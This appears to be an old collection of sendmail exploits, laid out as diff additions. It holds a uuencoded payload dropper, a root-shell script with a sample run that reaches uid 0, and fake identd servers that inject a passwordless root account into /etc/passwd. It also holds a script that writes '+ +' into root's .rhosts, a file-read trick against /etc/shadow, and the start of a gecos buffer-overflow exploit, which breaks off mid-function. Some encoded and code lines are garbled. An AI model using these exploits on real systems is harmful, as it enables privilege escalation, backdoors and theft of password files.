+H?F?From: nobody
+
+Mlocal, P=/tmp/in.telnet, F=flsSDFMmnP, S=10, R=20, A=mail -d \$u
+
+Mprog,  P=/tmp/in.telnet,   F=lsDFMeuP,  S=10, R=20, A=sh -c \$u
+
+S0
+
+R\$+                    \$#local \$:\$1                 just rewrite
+
+EOM
+
+cat $0 | sed "s:atreus::" | uudecode
+
+uncompress /tmp/in.telnet.Z
+
+chmod 755 /tmp/in.telnet
+
+mkdir /tmp/mail
+
+cp /tmp/sendmail.cf /tmp/mail
+
+cp /bin/sh /tmp/newsh
+
+chmod 666 /tmp/newsh
+
+$sendmail -d${n1}.116,${n2}.109,${n3}.112 `whoami`  <Q2RA)! %(atreus
+
+M5$,).9]$%38!E!= H,(LP$LV*KJ*8(15)".N(AI2!6Q*(@ HPM6U6<4A@716atreus
+
+M+H@"%QQ:D@!. ":U%L;2T'36E%H$D 0 H"!ML><#H0N.!B?A-(#4!5>PGGT9atreus
+
+M068Z7==^%;%A[ BS!U6]5@P*#4V;. $L*)YY,P%@$LP"B' [-X#=O=56&'N!atreus
+
+M]4'J<$(""V!.*1]U2@&Q4TJHY5J8,@FC%"+^00 3&, (" HC_B$@" 1@D*$@atreus
+
+M))R!$, GQ!0$'1^!' ,. H&@4;"CP$@ EIKMFFatreus
+
+MG%-6>24;66X)0AMAP %'&FZ< 8(98:3!1AURE)'G0A3TR::;<'H)IIADXKG0atreus
+
+M"W2T <<+;I1QQQQH%#35+Y",%40(+OET@!X5 @ )!2)  AT MN;AF:Z\Q@K atreus
+
+M 7F8E4([MJZ1:X<?AOC0JY DAY( ((!3UR__$-: )!)D"XT 8%!FEXLY)3"Latreus
+
+M)>02\*LD[8X+Q )U'20!M_U\!$H DDB24W8*6"M*N."$H@(8 D!#P'B?P&03atreus
+
+M0J 0\@,_,N"K\'C0@BBB5%15>Y(TV')3%QCH I  *.%R  0BI51#1!36 $ 
+4(1>7X0Y$5)%M!!R"TL$L(50[ atreus
+
+MI8N8&A"-4WJ:/7H#?P%H]060%G&Z00P!DP-, 8NA9 D\&B*,Gatreus
+
+M"Y$-X$=!(M1=D R9%R"'4$06M$/F!^0@E$)%? ^*GDO@R0% IQ I") %>LI"atreus
+
+M9 A@BH*,@!0("0-/B**G-)"/#GJ20^9,(Q1H((00HSM ')Z'D$F,3@#3$ HXatreus
+
+M$"**R!@@#P[$ D)JX<)$L&^%!4%&_/X'+&1\H0QT* ,>,/A#,H2!#F$ P _=atreus
+
+M0 8 S &):G(B%.GP!3.PX0U'5.(/\9 &(B**44HL@QOLD(8RN4&+1,B"$X+0atreus
+
+MA"0,(8Q<).(8T-"&-S3Q"W-\PQW.^(4^?I&/X88M=U*(0N_@%atreus
+
+M,M2A#6W(0R/+,(:L]?$+0Z#"$Z3P!28D80I4Z*,6OT $37+2DZ 4Y27)\(8Oatreus
+
+MG.&*8@@#&_!(AS?(80ZC9*4K82G+1M;REHJ,8R,?&1"=*T8I:]*(8S:A&-\K1CGKTHR -
+J4A'2M*2FO2D*$VI2E?*TI:Z]*4Patreus
+
+MC:E,9TK3FMKTICC-J4YWRM.>^O2G0 VJ4(=*U*(:]:A(3:I2E\K4ICKUJ5"-atreus
+
+MJE2G2M6J6O6J6,VJ5K?*U:YZ]:M@#:M8QTK6LIKUK&A-JUK7RM:VNO6M<(VKatreus
+
+M7.=*U[K:]:YXS>M2_0,$UP&+!"'V!BPN"(5D !B !W4"6)U0;R&5*P Ratreus
+
+M$()#[@$ L3XQ7"" 0;*HO H43OL'/SQ+%= ^+1]!"YT(VN=*=+atreus
+
+MW>I:][K8S:YVM\O=[GKWN^ -KWC'2][RFO>\Z$VO>M?+WO:Z][WPC:]\YTO?atreus
+
++^MKWOOC-KW[WFUS=atreus
+
+ atreus
+
+endatreus
+
+----------------------- CuT HeRe -------------------------------------
+
+Here it is the other script:
+
+/* What follows is a sample run exercising the latest sendmail hole and the
+script used to exploit this hole. This is a re-send; I neglected to escape
+the "." in the sendmail script, leaving the program slightly truncated. To
+fix this, I have escaped the . so prior to executing this you must remove
+the \. (does that make any sense? :-) There was also a small problem with
+nested quotes pointed out by Peter Wemm which I have fixed.
+
+This is the "small version" of the script; it assumes you have a sane
+sendmail.cf. In this manner, it is not a particularly robust "breakin
+script" but I believe it does illustrate how to exploit the bug.
+
+This program uses "calc.c," the program mentioned by Timothy Newsham in an
+earlier message. The program has been modified slightly so that it gives
+better results (it would occasionally fail to locate the offset of a config
+given a buggy sendmail. The fix is to force a sync() after it generates a
+coredump.) The remainder of the program was written by myself and a fellow
+student, Steven Dake.
+
+We have held off on releasing this script until we were able to notify the
+people responsible for system security at NAU. Locals subscribing to this
+digest beware; sendmail on our machines has been patched! :-) */
+
+Script started on Thu Mar 24 00:54:54 1994
+
+[pine] [1] date
+
+Thu Mar 24 00:54:57 MST 1994
+
+[pine] [2] whoami
+
+jwa
+
+[pine] [3] id
+
+uid=4473(jwa) gid=400(student)
+
+[pine] [4] ls -l sendbug.sh
+
+-rwx------   1 jwa      student     4893 Mar 24 00:46 sendbug.sh*
+
+[pine] [5] sendbug.sh
+
+Creating setid0 ...
+
+Creating calc...
+
+Scanning core image for /nau/local/lib/mail/sendmail.cf...
+
+Creating alias.sh ...
+
+Creating fake alias file...
+
+Faking alias pointer in new config file...
+
+Creating the sendmail script...
+
+Executing /usr/lib/sendmail -
+
+d4294935548.47,4294935549.116,4294935550.109,4294935551.112,4294935552.47,429493
+5553.115,429
+
+4935554.109,4294935555.46,4294935556.9
+
+Version 8.6.4
+
+220-pine.cse.nau.edu Sendmail 8.6.4/WHOOP-v1.0 ready at Thu, 24 Mar 1994
+
+00:55:21 -0700
+
+220 ESMTP spoken here
+
+250 pine.cse.nau.edu Hello jwa@localhost, pleased to meet you
+
+250 ... Sender ok
+
+250 ... Recipient ok
+
+354 Enter mail, end with "." on a line by itself
+
+250 AAA01803 Message accepted for delivery
+
+503 Need MAIL before RCPT
+
+503 Need MAIL command
+
+500 Command unrecognized
+
+500 Command unrecognized
+
+221 pine.cse.nau.edu closing connection
+
+setid0 is a suid shell.  executing...
+
+executing /bin/csh...
+
+pine# whoami
+
+root
+
+pine# id
+
+uid=0(root) gid=0(root)
+
+pine# exit
+
+pine# end of script.
+
+. and here's the program.
+
+#!/bin/sh
+
+# exploit new sendmail bug to give us a root shell
+
+# 24 mar 94  jwa/scd @nau.edu
+
+# "short version"
+
+# tested on sunos 5.2/sendmail 8.6.4
+
+# location of sendmail
+
+SENDMAIL=/usr/lib/sendmail
+
+# location of original sendmail.cf file
+
+CONFIG=/nau/local/lib/mail/sendmail.cf
+
+#CONFIG=`strings $SENDMAIL | grep sendmail.cf`
+
+# program to execute as root
+
+SHELL=/bin/csh
+
+TEMPDIR=/tmp/sendbug-tmp.$$
+
+mkdir $TEMPDIR
+
+chmod 700 $TEMPDIR
+
+cd $TEMPDIR
+
+cp $SENDMAIL sm
+
+chmod 700 sm
+
+echo "Creating setid0 ..."
+
+cat > setid.c << _EOF_
+
+/* set uid to zero, thus escaping the annoying csh and solaris sh
+
+ * problem..
+
+ *
+
+ * if (getuid() != geteuid()) {
+
+ *  printf("permission denied, you root-hacker you.\n");
+
+ *  exit(1);
+
+ * }
+
+ *
+
+ * .. must be run euid 0, obviously.  with no args it runs /bin/sh,
+
+ * otherwise it runs the 1st arg.
+
+ */
+
+#include <stdio.h>
+
+main(argc, argv)
+
+int argc;
+
+char *argv[];
+
+ int uid;
+
+ setuid(0);
+
+ setgid(0);
+
+ seteuid(0);  /* probabally redundant. */
+
+ setegid(0);
+
+ uid = getuid();
+
+ if (uid != 0) {
+
+  printf("setuid(0); failed!  aborting..\n");
+
+  exit(1);
+
+ }
+
+ if (argc !=2) {
+
+  printf("executing /bin/sh...\n");
+
+  system("/bin/sh");
+
+ }
+
+  else
+
+ {
+
+  printf("executing %s...\n", argv[1]);
+
+  system(argv[1]);
+
+ }
+
+_EOF_
+
+cc -o setid0 setid.c
+
+echo "Creating calc..."
+
+cat > calc.c << _EOF_
+
+/*
+
+ * Determines offset in sendmail of
+
+ * sendmail.cf file location.
+
+ * author: timothy newsham
+
+ */
+
+#include <fcntl.h>
+
+gencore()
+
+  int pid;
+
+  int fd[2];
+
+  if(pipe(fd) < 0) {
+
+    perror("pipe");
+
+    exit(1);
+
+    return(0);
+
+  }
+
+  pid = fork();
+
+  if(!pid) {
+
+    int f = open("./out", O_RDWR|O_CREAT, 0666);
+
+    dup2(f, 1); dup2(fd[0], 0);
+
+    close(f); close(fd[1]); close(fd[0]);
+
+    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
+
+    perror("exec");
+
+    exit(0);
+
+  } else {
+
+    sleep(2);
+
+    kill(pid, 11);
+
+  }
+
+  close(fd[0]);
+
+  close(fd[1]);
+
+main(argc,argv)
+
+char **argv;
+
+int argc;
+
+  unsigned int ConfFile,tTdvect,off;
+
+  gencore();
+
+  sync();   /* grr. */
+
+  tTdvect = find("ZZZZZZZZ", "core");
+
+  ConfFile = find(argv[1], "core");
+
+  if(!tTdvect || !ConfFile) {
+
+   return(1);
+
+  }
+
+  off = ConfFile - tTdvect;
+
+
+
+printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",  
+off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
+
+  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);
+
+int find(pattern, file)
+
+char *pattern,*file;
+
+  int fd;
+
+  int i, addr;
+
+  char c;
+
+  fd = open(file, 0);
+
+  i = 0;
+
+  addr = 0;
+
+  while(read(fd, &c, 1) == 1) {
+
+    if(pattern[i] == c)
+
+      i++;
+
+    else
+
+      i=0;
+
+    if(pattern[i] == '\0') {
+
+      addr -= strlen(pattern);
+
+      return(addr);
+
+    }
+
+    addr++;
+
+  }
+
+  return(0);
+
+_EOF_
+
+cc calc.c -o calc
+
+echo "Scanning core image for $CONFIG..."
+
+DEBUGFLAGS=`calc $CONFIG`
+
+echo "Creating alias.sh ..."
+
+echo "#!/bin/sh
+
+# this program will be executed when mail is sent to the fake alias.
+
+# since solaris sh and csh and tcsh refuse to run when euid != realuid,
+
+# we instead run the program we compiled above.
+
+/bin/chmod 6777 $TEMPDIR/setid0
+
+/bin/chown root $TEMPDIR/setid0
+
+/bin/sync
+
+" > alias.sh
+
+chmod 755 alias.sh
+
+echo "Creating fake alias file..."
+
+echo "yash: |$TEMPDIR/alias.sh" > aliases
+
+echo "Faking alias pointer in new config file..."
+
+egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
+
+echo "
+
+# hacks follow
+
+OA/$TEMPDIR/aliases                     # our fake alias file
+
+Ou0                                     # user ID to run as
+
+Og0                                     # group ID to run as
+
+DZWHOOP-v1.0" >> /tmp/sm.cf
+
+echo "Creating the sendmail script..."
+
+cat > sendmail.script << _EOF_
+
+helo
+
+mail from: <nobody>
+
+rcpt to: <yash>
+
+data
+
+yet another sendmail hole?  suid whoop?
+
+\.                                      # oops.. delete \ prior to execution
+
+quit
+
+_EOF_
+
+echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."
+
+$SENDMAIL $DEBUGFLAGS -bs < sendmail.script
+
+# give it time to execute.
+
+sleep 4
+
+# cleanup in 5 seconds
+
+(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &
+
+if [ -u setid0 ]
+
+then
+
+ echo "setid0 is a suid shell.  executing..."
+
+ cd /
+
+ $TEMPDIR/setid0 /bin/csh
+
+ echo "end of script."
+
+ exit 0
+
+else
+
+ echo "setid0 is not suid; script failed."
+
+ echo "apparently, you don't have the bug.  celebrate :-)"
+
+ exit 1
+
+fi
+
+--------------------------------- CuT HeRe --------------------------------
+
+-oE/filename bounce = 8.6.7 =
+
+Version affected: 8.6.7
+
+A bug in Sendmail 8.6.7 allows anyone to read any file, including the
+shadowed password file:
+
+/usr/lib/sendmail -oE/etc/shadow bounce
+From: your_username
+
+8.6.9 = 8.6.9 or earlier =
+
+Mail any file to yourself.
+
+------8<-------------------Cut Here--------------------8<-------------------
+
+# This is a shell archive.  Save it in a file, remove anything before
+
+# this line, and then unpack it by entering "sh file".  Note, it may
+
+# create directories; files and directories will be owned by you and
+
+# have default permissions.
+
+#
+
+# This archive contains:
+
+#
+
+#       description
+
+#       sm869.local
+
+#       sm869.remote
+
+#
+
+echo x - description
+
+sed 's/^X//' >description << 'END-of-description'
+
+X
+
+XProgram: sm869.remote
+
+X
+
+Xyou can:
+
+X
+
+X   run the body of the mail through a shell if
+
+X   sendmail is allowed to run a shell.
+
+X
+
+X   write the whole message to a file.
+
+X
+
+X   have it send back a file to an account you specify.
+
+X
+
+XThe last option is supposed to remove the file after sending
+
+Xit but I found that it hasn't in my tests.  Why?  Well
+
+Xit has multiple recipients, one of the recipients is a
+
+Xrecipient that will never go through.  So the data file
+
+Xgets kept around until it gives up on that host.  This
+
+Xcan be several days.
+
+X
+
+XProblems:
+
+X
+
+X  The action you specify will happen every 30minutes (the
+
+X  queue time, may be different) until it gives up sending
+
+X  to the unreachable host.  (Actually this may be false.
+
+X  I haven't left it around long enough to see if this happens.
+
+X  Perhaps sendmail is smart enough to remove the other recipients
+
+X  that did get delievered from the queue file).
+
+X
+
+X  If you send a file back to yourself it may get removed
+
+X  several days later.  If you get the password file or
+
+X  some other critical file you had better be ready to clean
+
+X  up.
+
+X
+
+X  Lots of logs.  Its fairly obvious from the log files that
+
+X  some hokey pokey is going on.  If you're sending a file
+
+X  back to yourself then you're pointing a finger at one
+
+X  of your accounts
+
+X
+
+XYou have to go into the program to change the options you
+
+Xwant.  The code is fairly well commented so this shouldn't
+
+Xbe any problem.
+
+X
+
+XProgram: sm869.local
+
+X
+
+XSame thing as above really except it works even if sendmail
+
+Xdoesnt check identd and you dont have to specify an unreachable
+
+Xhost.  The file goes straight to the queue.
+
+X
+
+END-of-description
+
+echo x - sm869.local
+
+sed 's/^X//' >sm869.local << 'END-of-sm869.local'
+
+X#!/bin/sh
+
+X#
+
+X# Exploit hole in sendmail 8.6.9 and earlier.
+
+X#
+
+X
+
+X# Either write a file or run a program.
+
+X#ACTION="|/tmp/runme"
+
+XACTION="/tmp/writeme"
+
+X
+
+X# Data file to read from and then remove
+
+XDATAFILE="/tmp/abc"
+
+X#DATAFILE=""
+
+X
+
+X# Who to run as
+
+XRUNAS="bin"
+
+X
+
+X# Who to send mail to
+
+XWHOAMI=`whoami`
+
+XSENDTO=$WHOAMI
+
+X#SENDTO="someone-else"
+
+X
+
+X# Build up arg and send it off
+
+Xif [ -n "$DATAFILE" ] ; then
+
+XARG="$WHOAMI
+
+XD$DATAFILE
+
+XC:$RUNAS
+
+XR\"$ACTION\""
+
+Xelse
+
+XARG="$WHOAMI
+
+XC:$RUNAS
+
+XR\"$ACTION\""
+
+Xfi
+
+Xsendmail -odq -F"$ARG" $SENDTO << _END_
+
+XThis is appearing in the mailbox
+
+Xand also being piped to the program or
+
+Xwritten to the file, UNLESS you specify
+
+Xa datafile above.  In that case the datafile
+
+Xwill be written and erased and this text will
+
+Xbe left (not deleted) in the queue directory.
+
+X_END_
+
+X
+
+END-of-sm869.local
+
+echo x - sm869.remote
+
+sed 's/^X//' >sm869.remote << 'END-of-sm869.remote'
+
+X#!/bin/sh
+
+X#
+
+X# exploit for sm869 or worse
+
+X# identd must not be enabled (port 113 must be free)
+
+X
+
+X# this must be a host that mail can go to (MX not pointing elsewhere)
+
+X# that we cant reach right now (ie. host doesnt exist anymore)
+
+XUNREACHABLE="goofy.uhcc.hawaii.edu"
+
+X
+
+X# Commands to run on remote host
+
+XCOMMANDS="touch /tmp/gotcha"
+
+X
+
+X# what host to run it on
+
+XTARGET="localhost"
+
+X
+
+X# work in a temp dir
+
+XTD=/tmp/.Xwork.$$
+
+Xmkdir $TD
+
+Xcd $TD
+
+X
+
+Xcat > a.c <<_END_
+
+X#include <sys/types.h>
+
+X#include <sys/socket.h>
+
+X#include <netinet/in.h>
+
+X
+
+X/* run body of mail through shell run as daemon */
+
+X#define REPLY "USERID : UNIX : a\nC:daemon\nR\"|sed
+
+'1,/^$/d'|/bin/sh\"\nHXxx:
+
+"
+
+X
+
+X#ifdef other_possibilities
+
+X/* write to a file as daemon */
+
+X#define REPLY "USERID : UNIX : a\nC:daemon\nR/tmp/writeme\nHXxx: "
+
+X/* send back a file to someone and erase it */
+
+X#define REPLY "USERID : UNIX :
+
+a\nD/tmp/sendtome\nRmy@address.here\nHXxx: "
+
+X#endif
+
+X
+
+Xreadline(fd, buf, len)
+
+Xchar *buf;
+
+X{
+
+X    int i = 0;
+
+X
+
+X    while(i < len && read(fd, &buf[i], 1) == 1 && buf[i]) {
+
+X       if(buf[i] == '\r' || buf[i] == '\n')
+
+X           break;
+
+X       i++;
+
+X    }
+
+X    buf[i] = '\0';
+
+X}
+
+X
+
+Xdie(str)
+
+Xchar *str;
+
+X{
+
+X    perror(str); exit(1);
+
+X}
+
+X
+
+Xmain()
+
+X{
+
+X    int s, s2, adlen;
+
+X    struct sockaddr_in ad;
+
+X    char buf[60];
+
+X
+
+X    ad.sin_family = AF_INET;
+
+X    ad.sin_port = htons(113);
+
+X    ad.sin_addr.s_addr = INADDR_ANY;
+
+X    if((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) die("socket");
+
+X    if(bind(s, (struct sockaddr *)&ad, sizeof(ad)) == -1) die("bind");
+
+X    if(listen(s, 1) == -1) die("listen");
+
+X    adlen = sizeof(ad);
+
+X    s2 = accept(s, (struct sockaddr *)&ad, &adlen);
+
+X    if(s2 == -1) die("accept");
+
+X    printf("Connection from %s port %d\n",
+
+X        inet_ntoa(ad.sin_addr), ntohs(ad.sin_port));
+
+X    readline(s2, buf, 50);
+
+X    sprintf(buf + strlen(buf), " : %s\n", REPLY);
+
+X    write(s2, buf, strlen(buf));
+
+X}
+
+X_END_
+
+X
+
+X# compile program
+
+Xecho "compiling"
+
+Xcc a.c -o ident
+
+Xecho "running fake ident"
+
+X./ident &
+
+X
+
+X# send to reomte
+
+Xecho "talking to remote"
+
+X(
+
+X  sleep 1; echo "helo"
+
+X  sleep 1; echo "mail from: "
+
+X  sleep 1; echo "rcpt to: "
+
+X  sleep 1; echo "data"
+
+X  echo "$COMMANDS"
+
+X  echo "."
+
+X  sleep 1; echo "quit"
+
+X  sleep 5
+
+X) | telnet $TARGET 25
+
+X
+
+X# cleanup
+
+Xcd /
+
+Xrm -rf $TD
+
+Xecho "done."
+
+X
+
+END-of-sm869.remote
+
+exit
+
+.................................. CuT HeRe ..................................
+
+8.6.9 newlines = 8.6.9 =
+
+When a message is queued for delivery by sendmail, a pair of files are
+written to the spool directory (/var/spool/mqueue on many systems). One of
+these files (qf<something>) contains information related to the processing
+of the message (headers, sender, recipient, etc.). Taking versions of
+sendmail prior to 8.6.10 as an example, one of the pieces of information
+maintained in this file is the name of the controlling user if mail is
+being delivered to a script (or file). By feeding sendmail a recipient
+address that contains newlines, it is possible to add lines to the queue
+file which specify a controlling user and an executable to run with that
+users access level. The 8.6.10 patch removes this hole, by stripping
+newlines from the recipient address before writing the queue file.
+
+EXPLOIT:
+
+/* smh.c - Michael R. Widner - atreus (2/27/95)
+
+ *
+
+ * a quick hack to abuse sendmail 8.6.9 or whatever else is subject to this
+
+ * hole.  It's really just a matter of passing newlines in arguments to
+
+ * sendmail and getting the stuff into the queue files.  If we run this
+
+ * locally with -odq we are guaranteed that it will be queue, rather than
+
+ * processed immediately.  Wait for the queue to get processed automatically
+
+ * or just run sendmail -q if you're impatient.
+
+ * usage: smh [ username [/path/to/sendmail]]
+
+ * It's worth noting that this is generally only good for getting bin.
+
+ * sendmail still wants to process the sendmail.cf file, which contains
+
+ * Ou1 and Og1 most of the time, limiting you to bin access.  Is there
+
+ * a way around this?
+
+ * cc -o smh smh.c should do the trick.  This just creates a bin owned
+
+ * mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.  Note that on some
+
+ * systems this is pretty much worthless, but you're smart enough to know
+
+ * which systems those are.  Aren't you?
+
+ */
+
+#include <sys/types.h>
+
+#include <unistd.h>
+
+#include <stdlib.h>
+
+main(argc, argv)
+
+int argc;
+
+char **argv;
+
+{
+
+        execlp(argv[2] ? argv[2] : "sendmail","sendmail","-odq","-p",
+
+        "ascii\nCroot\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\nMlocal,
+
+P=/bin/sh, F=lsDFMeu,
+
+A=sh -c $u\nR<\"|/bin/cp /bin/sh /tmp/newsh\">\nR<\"|/bin/chmod 6777
+
+/tmp/newsh\">\n$rascii ",
+
+        argv[1] ? argv[1] : "atreus",0);
+
+}
+
+................................ CuT HeRe ..................................
+
+8.6.10 ident/newlines = 8.6.10 =
+
+This is a sendmail 8.6.10 attack based on the problems that sendmail 8.6.10
+inherited from sendmail 8.6.9 .... Look at comments in the source. Two
+exploits follow:
+
+/* 8.6.10 sendmail attacker
+
+ *
+
+ * gcc ident.c -o ident
+
+ * add the following line to your /etc/inetd.conf:
+
+ * ident  stream tcp  nowait  root  /tmp/ident  in.identd
+
+ * then kill -HUP inetd
+
+ *
+
+ * Not for not public use or disclosure.
+
+ *
+
+ * This is a sendmail 8.6.10 attack based on the problems that
+
+ * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting
+
+ * information given to it by identd, which included bogus characters
+
+ * and newlines that it later appended to the queue file.  Sendmail 8.6.10
+
+ * supposedly "strips" newlines before they are written, however, it
+
+ * converts them to spaces, and the following code demonstrates that
+
+ * quick work-around patches are never ever stable...
+
+ *
+
+ * NOTES:  This hack only works when sendmail queues up the message for
+
+ * later delivery.  This depends on the configuration of sendmail.cf and
+
+ * on the machine loading.  If you can do something to drag the machine to
+
+ * its knees, then fire off this attack, you stand a much better chance of
+
+ * success.
+
+ *
+
+ * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the
+
+ * default user to bin.bin), this exploit will not work.
+
+ *
+
+ * Also, since this only works when sendmail queues up the message for
+
+ * later delivery, the time of execution is dependant on how sendmail
+
+ * has been configured in sendmail.cf and machine load.  Heavily loaded
+
+ * machines (or machines that have been intentionally flooded) have a
+
+ * greater possibility of this exploit working.
+
+ *
+
+ */
+
+#include <sys/types.h>
+
+#include <sys/fcntl.h>
+
+#include <sys/time.h>
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include <string.h>
+
+#include <unistd.h>
+
+/* TIMEOUT is the number of seconds to wait before closing the connection if
+
+ * the client doesn't provide the port pairs.
+
+ */
+
+#define TIMEOUT 120
+
+/* PROCINFO_BUFFER_SIZE must be bigger than 80 */
+
+#define OUTPUT_BUFFER_SIZE 2048
+
+#define SOCKET_BUFFER_SIZE 100
+
+unsigned short lport = 0, rport = 0;
+
+void
+
+main ()
+
+{
+
+    unsigned long here, there;
+
+    struct fd_set fdset;
+
+    struct timeval timeout;
+
+    char buffer[OUTPUT_BUFFER_SIZE];
+
+    char inbuffer[SOCKET_BUFFER_SIZE];
+
+    int len;
+
+    int fd;
+
+    FD_ZERO (&fdset);
+
+    FD_SET (0, &fdset);
+
+    timeout.tv_sec = TIMEOUT;
+
+    timeout.tv_usec = 0;
+
+    select (1, &fdset, NULL, NULL, &timeout);
+
+    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );
+
+    if (len <= 0)
+
+    exit (0);
+
+    FD_SET (0, &fdset);
+
+    sprintf (buffer, "%s : USERID : UNIX : %s\r\n", inbuffer,
+
+    "Croot\r\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\r\nMlocal,
+
+    P=/bin/sh, F=lsDFMeu, A=sh -c $u\r\nR<\"|/bin/echo toor::0:1:toor:/:/bin/csh
+
+ >> /etc/passwd\">\r\nR<\"|/usr/bin/chmod 4755 /usr/bin/time\");
+
+    write (1, buffer, strlen (buffer));
+
+    exit (0);
+
+}
+
+................................ CuT HeRe ..................................
+
+Second Exploit follows:
+
+/* 8.6.10 sendmail attacker
+
+ *
+
+ * gcc ident.c -o ident
+
+ * add the following line to your /etc/inetd.conf:
+
+ * ident  stream tcp  nowait  root  /tmp/ident  in.identd
+
+ * then kill -HUP inetd
+
+ *
+
+ * Not for not public use or disclosure.
+
+ *
+
+ * This is a sendmail 8.6.10 attack based on the problems that
+
+ * sendmail 8.6.10 inherited from sendmail 8.6.9 - blindly accepting
+
+ * information given to it by identd, which included bogus characters
+
+ * and newlines that it later appended to the queue file.  Sendmail 8.6.10
+
+ * supposedly "strips" newlines before they are written, however, it
+
+ * converts them to spaces, and the following code demonstrates that
+
+ * quick work-around patches are never ever stable...
+
+ *
+
+ * NOTES: If sendmail.cf is configured with Og1 and Ou1 lines (setting the
+
+ * default user to bin.bin), this exploit will not work.
+
+ *
+
+ * Also, since this only works when sendmail queues up the message for
+
+ * lar delivery, the time of execution is dependant on how sendmail
+
+ * has been configured in sendmail.cf and machine load.  Heavily loaded
+
+ * machines (or machines that have been intentionally flooded) have a
+
+ * greater possibility of this exploit working.
+
+ *
+
+ */
+
+#include <sys/types.h>
+
+#include <sys/fcntl.h>
+
+#include <sys/time.h>
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include <string.h>
+
+#include <unistd.h>
+
+/* TIMEOUT is the number of seconds to wait before closing the connection if
+
+ * the client doesn't provide the port pairs.
+
+ */
+
+#define TIMEOUT 120
+
+/* PROCINFO_BUFFER_SIZE must be bigger than 80 */
+
+#define OUTPUT_BUFFER_SIZE 2048
+
+#define SOCKET_BUFFER_SIZE 100
+
+unsigned short lport = 0, rport = 0;
+
+void
+
+main ()
+
+{
+
+    unsigned long here, there;
+
+    struct fd_set fdset;
+
+    struct timeval timeout;
+
+    char buffer[OUTPUT_BUFFER_SIZE];
+
+    char inbuffer[SOCKET_BUFFER_SIZE];
+
+    int len;
+
+    int fd;
+
+    FD_ZERO (&fdset);
+
+    FD_SET (0, &fdset);
+
+    timeout.tv_sec = TIMEOUT;
+
+    timeout.tv_usec = 0;
+
+    select (1, &fdset, NULL, NULL, &timeout);
+
+    len = read (0, inbuffer , SOCKET_BUFFER_SIZE - 1 );
+
+    if (len <= 0)
+
+    exit (0);
+
+    FD_SET (0, &fdset);
+
+    sprintf (buffer, "%s : USERID : UNIX : %s\r\n", inbuffer,
+
+    "Croot\t\t\t\t\t\t\tMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\t
+
+    Mlocal,
+
+    P=/bin/sh, F=lsDFMeu, A=sh -c $u\t\t\t\t\t\tR<\"|/bin/echo toor::0:1:toor:/:
+
+/bin/csh >> /etc/passwd\">\t\t\tR<\"|/usr/bin/chmod 4755 /usr/bin/time\">\r\n
+
+    $rascii done");
+
+    write (1, buffer, strlen (buffer));
+
+    exit (0);
+
+}
+
+
+
+................................ CuT HeRe ..................................
+
+HP-UX = HP-UX 9.x =
+
+#!/bin/sh
+
+# This works on virgin HPUX 9.x sendmail.cf
+
+# The link can be set to any file on the system, it will append the contents
+
+# of the email to the linked file (/etc/passwd, /etc/hosts.equiv, /.rhosts)..
+
+# - sirsyko
+
+r00tDIR=`grep root /etc/passwd |cut -f6 -d:`
+
+RunDMC=`hostname`
+
+if [ -f /tmp/dead.letter ]; then rm /tmp/dead.letter
+
+fi
+
+if [ -f /tmp/dead.letter ]; then
+
+ echo "Sorry, aint gonna work"
+
+ exit
+
+fi
+
+ln -s  ${r00tDIR}/.rhosts /tmp/dead.letter
+
+(
+
+sleep 1
+
+echo "helo"
+
+echo "mail from: noone"
+
+echo "rcpt to: noone@bounce"
+
+echo "data"
+
+echo "+ +"
+
+echo "."
+
+sleep 3
+
+echo "quit"
+
+) | telnet ${RunDMC} 25
+
+sleep 5
+
+remsh ${RunDMC} -l root
+
+............... CuT HeRe ...............
+
+What the r00t guys exploit does is just this:
+
+   * creates a symbolic link to the target file (in this case '.rhosts' in
+     root's directory) called '/tmp/dead.letter'.
+   * Then sends a message (containing lines you want to append) to a
+     non-existent user.
+   * Sendmail is configured (as default) to append lines of non-recipient
+     messages to '/tmp/dead.letter' and does it with root privileges. If
+     '/tmp/dead.letter' is a symbolic link Sendmail will follow it and will
+     overwrite the pre-existent file.
+   * Probably if Sendmail configuration has been changed to make it behave
+     in a different way, looking at the cf file could lead you to exploit
+     the bug the same.
+
+8.7.5 gecos = 8.X.X <8.8.0 = TeSTed oN 8.6.12
+
+This bug was pointed out by Mudge of L0pht on Bugtraq on Sept 1996,
+excerpts follow:
+
+A buffer overflow condition exists that allows a user to overwrite the
+information in a saved stack frame. When the function returns, the saved
+frame is popped off of the stack and user code can be executed. If a user
+is able to alter his/her gecos field then that user can exploit a coding
+flaw in sendmail to elevate their effective UID to 0.
+
+The actual problem in the code is quite apparent.
+
+     Inside recipient.c we find the following:
+
+       char nbuf[MAXNAME + 1];
+
+       ...
+
+       buildfname(pw->pw_gecos, pw->pw_name, nbuf);
+
+The problem is that nbuf[MAXNAME + 1] is a fixed length buffer and as we
+will soon see, buildfname() does not honor this. [ ..... ]
+
+This particular problem has been fixed in Sendmail 8.8 beta.
+
+Here we have an example of exploit:
+
+------------------------------ Cut Here ------------------------------------
+
+/*                               Hi !                                       */
+
+/* This is exploit for sendmail bug (version 8.6.12 for FreeBSD 2.1.0).     */
+
+/* If you have any problems with it, send letter to me.                     */
+
+/*                             Have fun !                                   */
+
+/* -----------------   Dedicated to my beautiful lady   ------------------  */
+
+/* Leshka Zakharoff, 1996. E-mail: leshka@chci.chuvashia.su                 */
+
+#include <stdio.h>
+
+main()
+
+{
+
+void make_files();
+
+     make_files();
+
+     system("EDITOR=./hack;export EDITOR;chmod +x hack;chfn;/usr/sbin/sendmail;e
+
+cho See result in /tmp");
+
+}
+
+void make_files()
